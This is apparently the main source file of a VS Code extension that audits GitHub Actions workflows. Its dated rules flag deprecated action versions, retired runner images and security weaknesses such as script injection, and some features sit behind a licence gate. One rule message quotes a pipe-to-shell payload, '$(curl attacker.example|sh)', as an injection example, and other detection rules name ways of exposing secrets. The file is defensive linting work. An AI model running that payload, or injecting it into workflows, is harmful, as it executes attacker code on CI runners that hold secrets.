// ⛔손으로 고치지 마라 — vsix_build.py 가 찍는다.
const vscode = require('vscode');
const path = require('path');
const lic = require('./license.js');
const S = {"paste": "Paste a workflow or action.yml here", "check": "Find the break dates", "run": "Checking this file against every dated rule", "done": "Break dates and exposures below.", "nothing_found": "Nothing dated found here. Every action version, runner label and trigger in this file is still supported.", "need_key": "Full version: scans every workflow in the repository in one pass and exports the dated audit. $29 once - one licence key per person or team seat - 7-day full refund. A US DevOps engineer averages $59.11/hour, so about 29 minutes.", "buy": "Get the full version - $29", "enter_key": "Enter licence key", "key_ok": "Licence accepted. Workspace scan, export, CI JSON and watch-on-save are unlocked.", "key_bad": "That key was not accepted. Check for a stray space, or copy it again from the Polar licence email."};
const PAID = ["workspace_scan", "export_report", "ci_json", "watch_on_save"];

function out() {
  if (!out._c) out._c = vscode.window.createOutputChannel('Workflow Break-Date Audit');
  return out._c;
}

// ★무료 — ★열린 파일 하나를 ★끝까지 본다. ⛔키를 묻지 않는다.
async function runCurrent() {
  const ed = vscode.window.activeTextEditor;
  if (!ed) { vscode.window.showInformationMessage(S.nothing_found); return null; }
  const text = ed.document.getText();
  const hits = scan(text, ed.document.fileName);
  report([{ file: ed.document.fileName, hits: hits }]);
  vscode.window.showInformationMessage(hits.length ? S.done : S.nothing_found);
  return hits;
}

function report(rows) {
  const c = out(); c.clear();
  let n = 0;
  // ★설정을 읽는다 — min_severity. ⛔전에는 안 읽어서 설정이 거짓말이었다 (s126)
  const _ORD = { info: 0, warn: 1, error: 2 };
  const _min = _ORD[String(vscode.workspace.getConfiguration('workflow-break-date-audit').get('min_severity')
    || 'info').toLowerCase()] || 0;
  for (const r of rows) {
    const _hits = r.hits.filter(function (h) {
      return (_ORD[String(h.sev || 'info').toLowerCase()] || 0) >= _min;
    });
    if (!_hits.length) continue;
    c.appendLine(path.basename(r.file));
    for (const h of _hits) { c.appendLine('  ' + h.line + ': ' + h.msg); n++; }
  }
  c.appendLine('—— ' + n + ' ——');
  c.show(true);
  return n;
}

// ★한 파일을 훑어 ★줄번호와 메시지를 낸다. ⛔무료·유료가 ★같은 함수를 쓴다 (같은 품질).
const RULES = [{"pattern": "uses:\\s*actions/checkout@v[1-4](?:[.\\s\"\\'#]|$)", "flags": "", "message": "actions/checkout at this major runs on Node 20 (v3 and older run on Node 16). Node 20 is removed from GitHub-hosted runners on 2026-09-23; actions still declaring node20 stop starting on that date. Measured 2026-09-10: v5 is the first major of this action that declares node24, and v7 is the current major.", "fix": "actions/checkout@v7", "sev": "error"}, {"pattern": "uses:\\s*actions/setup-node@v[1-4](?:[.\\s\"\\'#]|$)", "flags": "", "message": "actions/setup-node at this major runs on Node 20 (v3 and older run on Node 16). Node 20 is removed from GitHub-hosted runners on 2026-09-23; actions still declaring node20 stop starting on that date. Measured 2026-09-10: v5 is the first major of this action that declares node24, and v7 is the current major.", "fix": "actions/setup-node@v7", "sev": "error"}, {"pattern": "uses:\\s*actions/setup-python@v[1-5](?:[.\\s\"\\'#]|$)", "flags": "", "message": "actions/setup-python at this major runs on Node 20 (v4 and older run on Node 16). Node 20 is removed from GitHub-hosted runners on 2026-09-23; actions still declaring node20 stop starting on that date. Measured 2026-09-10: v6 is the first major of this action that declares node24, and v7 is the current major.", "fix": "actions/setup-python@v7", "sev": "error"}, {"pattern": "uses:\\s*actions/cache@v[3-4](?:[.\\s\"\\'#]|$)", "flags": "", "message": "actions/cache at this major runs on Node 20 (v3 runs on Node 16). Node 20 is removed from GitHub-hosted runners on 2026-09-23; actions still declaring node20 stop starting on that date. Measured 2026-09-10: v5 is the first major of this action that declares node24, and v6 is the current major.", "fix": "actions/cache@v6", "sev": "error"}, {"pattern": "uses:\\s*actions/upload-artifact@v[4-5](?:[.\\s\"\\'#]|$)", "flags": "", "message": "actions/upload-artifact at this major runs on Node 20 (v5 is still Node 20, unlike most actions). Node 20 is removed from GitHub-hosted runners on 2026-09-23; actions still declaring node20 stop starting on that date. Measured 2026-09-10: v6 is the first major of this action that declares node24, and v7 is the current major.", "fix": "actions/upload-artifact@v7", "sev": "error"}, {"pattern": "uses:\\s*actions/download-artifact@v[4-6](?:[.\\s\"\\'#]|$)", "flags": "", "message": "actions/download-artifact at this major runs on Node 20 (v6 is still Node 20 — this one lags a major behind upload-artifact). Node 20 is removed from GitHub-hosted runners on 2026-09-23; actions still declaring node20 stop starting on that date. Measured 2026-09-10: v7 is the first major of this action that declares node24, and v8 is the current major.", "fix": "actions/download-artifact@v8", "sev": "error"}, {"pattern": "uses:\\s*actions/github-script@v7(?:[.\\s\"\\'#]|$)", "flags": "", "message": "actions/github-script at this major runs on Node 20 (v6 and older run on Node 16). Node 20 is removed from GitHub-hosted runners on 2026-09-23; actions still declaring node20 stop starting on that date. Measured 2026-09-10: v8 is the first major of this action that declares node24, and v9 is the current major.", "fix": "actions/github-script@v9", "sev": "error"}, {"pattern": "uses:\\s*actions/setup-java@v[1-4](?:[.\\s\"\\'#]|$)", "flags": "", "message": "actions/setup-java at this major runs on Node 20 (v3 and older run on Node 16). Node 20 is removed from GitHub-hosted runners on 2026-09-23; actions still declaring node20 stop starting on that date. Measured 2026-09-10: v5 is the first major of this action that declares node24, and v6 is the current major.", "fix": "actions/setup-java@v6", "sev": "error"}, {"pattern": "uses:\\s*actions/setup-go@v[1-5](?:[.\\s\"\\'#]|$)", "flags": "", "message": "actions/setup-go at this major runs on Node 20 (v4 and older run on Node 16). Node 20 is removed from GitHub-hosted runners on 2026-09-23; actions still declaring node20 stop starting on that date. Measured 2026-09-10: v6 is the first major of this action that declares node24, and v7 is the current major.", "fix": "actions/setup-go@v7", "sev": "error"}, {"pattern": "uses:\\s*actions/setup-dotnet@v[1-4](?:[.\\s\"\\'#]|$)", "flags": "", "message": "actions/setup-dotnet at this major runs on Node 20 (v3 and older run on Node 16). Node 20 is removed from GitHub-hosted runners on 2026-09-23; actions still declaring node20 stop starting on that date. Measured 2026-09-10: v5 is the first major of this action that declares node24, and v6 is the current major.", "fix": "actions/setup-dotnet@v6", "sev": "error"}, {"pattern": "^\\s*using:\\s*[\\'\"]?node20[\\'\"]?\\s*$", "flags": "i", "message": "This action declares runs.using: 'node20'. Runners began defaulting to Node 24 on 2026-06-16 and node 20 is removed from GitHub-hosted runners on 2026-09-23; actions still declaring node20 stop starting on that date.", "fix": "using: 'node24'", "sev": "error"}, {"pattern": "^\\s*using:\\s*[\\'\"]?node(?:12|16)[\\'\"]?\\s*$", "flags": "i", "message": "This action declares runs.using: 'node16' or 'node12'. Both runtimes were already removed from GitHub-hosted runners, so the action cannot start at all.", "fix": "using: 'node24'", "sev": "error"}, {"pattern": "ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION", "flags": "", "message": "This is the temporary escape hatch that forces an action back onto Node 20. It stops working when Node 20 is removed from the runner on 2026-09-23, so it buys time, not a fix.", "fix": "Move the action to node24 and delete this variable", "sev": "warn"}, {"pattern": "uses:\\s*actions/upload-artifact@v[1-3](?:[.\\s\"\\'#]|$)", "flags": "", "message": "actions/upload-artifact v1-v3 stopped working on 2025-01-30. The artifact backend no longer accepts these versions, so the step fails immediately.", "fix": "actions/upload-artifact@v7", "sev": "error"}, {"pattern": "uses:\\s*actions/download-artifact@v[1-3](?:[.\\s\"\\'#]|$)", "flags": "", "message": "actions/download-artifact v1-v3 stopped working on 2025-01-30 together with the v3 upload backend. The step fails immediately.", "fix": "actions/download-artifact@v8", "sev": "error"}, {"pattern": "uses:\\s*actions/cache@v[1-2](?:[.\\s\"\\'#]|$)", "flags": "", "message": "actions/cache v1-v2 were closed down on 2025-02-01 and fully retired on 2025-03-01. Workflows that still call them fail.", "fix": "actions/cache@v6", "sev": "error"}, {"pattern": "\\bubuntu-22\\.04(?:-arm)?\\b", "flags": "", "message": "The ubuntu-22.04 runner image begins deprecation on 2026-09-17 and is fully unsupported on 2027-04-17. During the deprecation window GitHub runs 24-hour brownouts, and a job scheduled inside one is terminated with an error.", "fix": "ubuntu-24.04, ubuntu-26.04, or ubuntu-latest (arm: ubuntu-24.04-arm)", "sev": "error"}, {"pattern": "\\bubuntu-(?:20\\.04|18\\.04|16\\.04)\\b", "flags": "", "message": "The ubuntu-20.04 runner image was fully unsupported from 2025-04-15 (18.04 and 16.04 earlier still). A job requesting this label fails to find a runner.", "fix": "ubuntu-24.04", "sev": "error"}, {"pattern": "\\bwindows-(?:2016|2019)\\b", "flags": "", "message": "The windows-2019 runner image was retired on 2025-06-30. A job requesting this label fails to find a runner.", "fix": "windows-2022 or windows-2025", "sev": "error"}, {"pattern": "\\bmacos-1[0-3](?:-[a-z0-9]+)?\\b", "flags": "", "message": "The macOS 13 runner image was fully unsupported from 2025-12-04 (macOS 12 and older earlier still). A job requesting this label fails to find a runner.", "fix": "macos-15 or macos-latest", "sev": "error"}, {"pattern": "\\bmacos-latest\\b", "flags": "", "message": "macos-latest no longer means macOS 15. The label migration began 2026-06-15 and took 30 days, so it now points at the macOS 26 image, with a different Xcode set.", "fix": "macos-15 if you need the previous image; macos-latest is fine if you do not", "sev": "warn"}, {"pattern": "\\bwindows-(?:latest|2025)\\b", "flags": "", "message": "windows-latest and windows-2025 were migrated to Visual Studio 2026 by default between 2026-06-08 and 2026-06-15. A build that assumes the VS 2022 toolset can fail with no change to your code.", "fix": "windows-2022 if you need Visual Studio 2022", "sev": "warn"}, {"pattern": "echo\\s+[\"\\']?::(?:set-env|add-path)\\b", "flags": "", "message": "The ::set-env and ::add-path workflow commands were disabled on 2020-11-16 for a security fix. They are ignored, so the variable or path is silently never set.", "fix": "echo \"NAME=value\" >> \"$GITHUB_ENV\"  /  echo \"/path\" >> \"$GITHUB_PATH\"", "sev": "error"}, {"pattern": "::set-output\\b", "flags": "", "message": "::set-output was deprecated on 2022-10-11 and is slated for removal. It already prints a warning annotation on every run.", "fix": "echo \"name=value\" >> \"$GITHUB_OUTPUT\"", "sev": "warn"}, {"pattern": "::save-state\\b", "flags": "", "message": "::save-state was deprecated on 2022-10-11 alongside ::set-output and is slated for removal.", "fix": "echo \"name=value\" >> \"$GITHUB_STATE\"", "sev": "warn"}, {"pattern": "^\\s*(?:-\\s*)?pull_request_target\\s*:?\\s*$", "flags": "", "message": "pull_request_target runs in the context of the base repository: a read/write GITHUB_TOKEN and every secret are available, while the pull request itself comes from a stranger.", "fix": "pull_request, unless you specifically need the base-repo token", "sev": "warn"}, {"pattern": "ref:\\s*\\$\\{\\{\\s*github\\.event\\.pull_request\\.head\\.(?:sha|ref)", "flags": "", "message": "This checks out the pull request author's code. Under pull_request_target or workflow_run that untrusted code then runs in a job that holds your secrets.", "fix": "Omit ref: so the base commit is checked out, or move the build to a pull_request job", "sev": "error"}, {"pattern": "\\$\\{\\{\\s*github\\.event\\.[a-zA-Z_.]*(?:title|body|message|label|login|name)\\s*\\}\\}", "flags": "", "message": "Attacker-controlled text is interpolated straight into the workflow. Inside a run: block a pull request titled $(curl attacker.example|sh) executes on your runner as written.", "fix": "Pass it via env: and reference \"$VAR\" in the shell, quoted", "sev": "error"}, {"pattern": "\\$\\{\\{\\s*github\\.head_ref\\s*\\}\\}", "flags": "", "message": "A branch name is attacker-controlled and may contain shell metacharacters. Used inside a run: block it is the same injection as a pull request title.", "fix": "Pass it via env: and reference \"$VAR\" in the shell, quoted", "sev": "warn"}, {"pattern": "permissions:\\s*write-all\\b", "flags": "", "message": "write-all grants every scope of the GITHUB_TOKEN to every step in scope, including any third-party action that runs there.", "fix": "permissions: contents: read (then add only the scopes a job needs)", "sev": "error"}, {"pattern": "secrets:\\s*inherit\\b", "flags": "", "message": "secrets: inherit hands the called workflow every secret in the repository, not the two or three it actually uses.", "fix": "secrets: {NPM_TOKEN: ${{ secrets.NPM_TOKEN }}} — list them", "sev": "warn"}, {"pattern": "run:.*\\$\\{\\{\\s*secrets\\.", "flags": "", "message": "A secret interpolated directly into a shell command line. It is visible in the process arguments on the runner and survives in shell traces and crash dumps.", "fix": "env: with the secret, then reference \"$VAR\" in the command", "sev": "warn"}, {"pattern": "persist-credentials:\\s*true\\b", "flags": "", "message": "The checkout token is written into .git/config and stays there for the rest of the job, where any later step or action can read it.", "fix": "persist-credentials: false unless a later step really pushes", "sev": "warn"}, {"pattern": "uses:\\s*(?!actions/|github/)[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+@(?:main|master)\\b", "flags": "", "message": "This action is pinned to a branch. Whatever lands on that branch runs in your pipeline with your token, with no change to your own code.", "fix": "owner/repo@<40-character commit sha>", "sev": "error"}, {"pattern": "uses:\\s*(?!actions/|github/)[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+@(?!v?[0-9a-f]{40}\\b)[^\\s\"\\']+", "flags": "", "message": "A third-party action pinned to a tag, not a commit. Tags can be repointed: in March 2025 tj-actions/changed-files had its tags moved to code that printed runner secrets into public build logs (CVE-2025-30066).", "fix": "owner/repo@<40-character commit sha>  # v4.2.1", "sev": "warn"}];
function scan(text, fileName) {
  const lines = String(text).split(/\r?\n/);
  const cfg = vscode.workspace.getConfiguration('workflow-break-date-audit');
  const extra = cfg.get('extraRules');
  const feed = (globalThis.__yjFeed && Array.isArray(globalThis.__yjFeed.rules)) ? globalThis.__yjFeed.rules : [];
  const rules = RULES.concat(Array.isArray(extra) ? extra : [], feed);
  const hits = [];
  for (let i = 0; i < lines.length; i++) {
    for (const r of rules) {
      let re;
      try { re = new RegExp(r.pattern, r.flags || ''); } catch (e) { continue; }
      // ★s126 — ★심각도를 실어 보낸다. ⛔없으면 min_severity 가 ★전부를 지운다 (내가 만들 뻔한 거짓말)
      if (re.test(lines[i])) hits.push({ line: i + 1, msg: r.message, fix: r.fix || null,
                                         sev: r.sev || 'warn' });
    }
  }
  return hits;
}

const SNIPPETS = {};

// ★무료 — ★고른 줄만 본다 (⛔파일 전체가 아니다. 명세가 그렇게 약속하면 ★이것을 찍는다)
async function runSelection() {
  const ed = vscode.window.activeTextEditor;
  if (!ed || ed.selection.isEmpty) { vscode.window.showInformationMessage(S.nothing_found); return null; }
  const text = ed.document.getText(ed.selection);
  const base = ed.selection.start.line;
  const hits = scan(text, ed.document.fileName).map(function (h) {
    return { line: h.line + base, msg: h.msg, fix: h.fix };
  });
  report([{ file: ed.document.fileName, hits: hits }]);
  vscode.window.showInformationMessage(hits.length ? S.done : S.nothing_found);
  return hits;
}

// ★무료 — ★들어 있는 규칙·스니펫 목록
async function listRules() {
  const c = out(); c.clear();
  c.appendLine('rules ' + RULES.length + ' / snippets ' + Object.keys(SNIPPETS).length);
  for (const r of RULES) { c.appendLine('  ' + r.message); }
  for (const k of Object.keys(SNIPPETS)) { c.appendLine('  + ' + k); }
  c.show(true);
}

// ★유료 — ★여기서 ★키를 묻는다. ⛔무료 명령은 이 문을 지나지 않는다.
async function paidGate(ctx) { return await lic.ensure(vscode, ctx, S); }

async function scanWorkspace(ctx) {
  if (!(await paidGate(ctx))) return;
  // ★설정을 읽는다 — max_files · exclude_glob. ⛔전에는 박혀 있어서 설정이 거짓말이었다 (s126)
  const _c = vscode.workspace.getConfiguration('workflow-break-date-audit');
  const _max = Number(_c.get('max_files')) || 2000;
  const _skip = String(_c.get('exclude_glob') || '**/node_modules/**');
  const files = await vscode.workspace.findFiles('**/*', _skip, _max);
  const rows = [];
  for (const f of files) {
    try {
      const doc = await vscode.workspace.openTextDocument(f);
      rows.push({ file: f.fsPath, hits: scan(doc.getText(), f.fsPath) });
    } catch (e) { /* 열 수 없는 파일은 건너뛴다 */ }
  }
  report(rows);
}

// ★유료 — ★CSV · JSON · HTML ★셋 다 쓴다.
//   🔴s125: ⛔전에는 CSV 하나만 썼는데 ★프롬프트는 "CSV / JSON / HTML" 이라고 약속했다
//     ⇒ ★검수가 옳게 잡았다("⑤거짓 주장"). ★법(S24): 한계를 만나면 ⛔좁히지 말고 ★손을 넓힌다.
async function exportReport(ctx) {
  if (!(await paidGate(ctx))) return;
  const ed = vscode.window.activeTextEditor;
  const rows = ed ? [{ file: ed.document.fileName, hits: scan(ed.document.getText(), ed.document.fileName) }] : [];
  const ws = vscode.workspace.workspaceFolders;
  if (!ws || !ws.length) { vscode.window.showWarningMessage(S.nothing_found); return; }
  const flat = [];
  for (const r of rows) for (const h of r.hits) flat.push({ file: r.file, line: h.line, message: h.msg });
  const csv = ['file,line,message'].concat(
    flat.map(function (h) { return [h.file, h.line, String(h.message).replace(/,/g, ' ')].join(','); })
  ).join('\n');
  const esc = function (t) {
    return String(t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  };
  const html = ['<!doctype html><meta charset="utf-8"><title>report</title>',
    '<table border="1" cellpadding="4"><tr><th>file</th><th>line</th><th>message</th></tr>'
  ].concat(flat.map(function (h) {
    return '<tr><td>' + esc(h.file) + '</td><td>' + h.line + '</td><td>' + esc(h.message) + '</td></tr>';
  })).concat(['</table>']).join('\n');
  // ★설정을 ★먼저 읽는다 (report_format). ⛔기본값이 없을 때만 물어본다.
  const cfgFmt = String(vscode.workspace.getConfiguration('workflow-break-date-audit').get('reportFormat')
    || vscode.workspace.getConfiguration('workflow-break-date-audit').get('report_format') || '').toUpperCase();
  const pick = ['CSV', 'JSON', 'HTML'].indexOf(cfgFmt) >= 0 ? cfgFmt
    : await vscode.window.showQuickPick(['CSV', 'JSON', 'HTML'], { placeHolder: S.run });
  if (!pick) return;
  const body = pick === 'CSV' ? csv : (pick === 'JSON' ? JSON.stringify(flat, null, 2) : html);
  const uri = vscode.Uri.joinPath(ws[0].uri, 'workflow-break-date-audit-report.' + pick.toLowerCase());
  await vscode.workspace.fs.writeFile(uri, Buffer.from(body, 'utf8'));
  vscode.window.showInformationMessage(S.done + ' \u2192 ' + uri.fsPath);
}

async function ciJson(ctx) {
  if (!(await paidGate(ctx))) return;
  const ed = vscode.window.activeTextEditor;
  const hits = ed ? scan(ed.document.getText(), ed.document.fileName) : [];
  const ws = vscode.workspace.workspaceFolders;
  if (!ws || !ws.length) { vscode.window.showWarningMessage(S.nothing_found); return; }
  const uri = vscode.Uri.joinPath(ws[0].uri, 'workflow-break-date-audit-report.json');
  await vscode.workspace.fs.writeFile(uri, Buffer.from(JSON.stringify({ hits: hits }, null, 2), 'utf8'));
  vscode.window.showInformationMessage(S.done + ' → ' + uri.fsPath);
}

async function watchOnSave(ctx) {
  if (!(await paidGate(ctx))) return;
  if (watchOnSave._d) { watchOnSave._d.dispose(); watchOnSave._d = null;
    vscode.window.showInformationMessage(S.done); return; }
  watchOnSave._d = vscode.workspace.onDidSaveTextDocument(function (doc) {
    report([{ file: doc.fileName, hits: scan(doc.getText(), doc.fileName) }]);
  });
  ctx.subscriptions.push(watchOnSave._d);
  vscode.window.showInformationMessage(S.run);
}

function activate(ctx) {
  try { lic.pullFeed(ctx, "workflow-break-date-audit").then(function (f) { if (f && Array.isArray(f.rules)) globalThis.__yjFeed = f; }).catch(function () {}); } catch (e) {}
  const reg = function (id, fn) { ctx.subscriptions.push(vscode.commands.registerCommand(id, fn)); };
  reg('workflow-break-date-audit.audit_file', runCurrent);
  reg('workflow-break-date-audit.audit_selection', runSelection);
  reg('workflow-break-date-audit.list_rules', listRules);
  reg('workflow-break-date-audit.workspace_scan', function () { return scanWorkspace(ctx); });
  reg('workflow-break-date-audit.export_report', function () { return exportReport(ctx); });
  reg('workflow-break-date-audit.ci_json', function () { return ciJson(ctx); });
  reg('workflow-break-date-audit.watch_on_save', function () { return watchOnSave(ctx); });
  // ★설정을 읽는다 — show_on_start. ⛔전에는 안 읽어서 설정이 거짓말이었다 (s126)
  if (vscode.workspace.getConfiguration('workflow-break-date-audit').get('show_on_start') === true) {
    if (typeof runCurrent === 'function') { try { runCurrent(ctx); } catch (e) { /* 열린 파일이 없으면 조용히 */ } }
  }
}
function deactivate() {
  if (typeof watchOnSave === 'function' && watchOnSave._d) watchOnSave._d.dispose();
}
module.exports = { activate: activate, deactivate: deactivate };
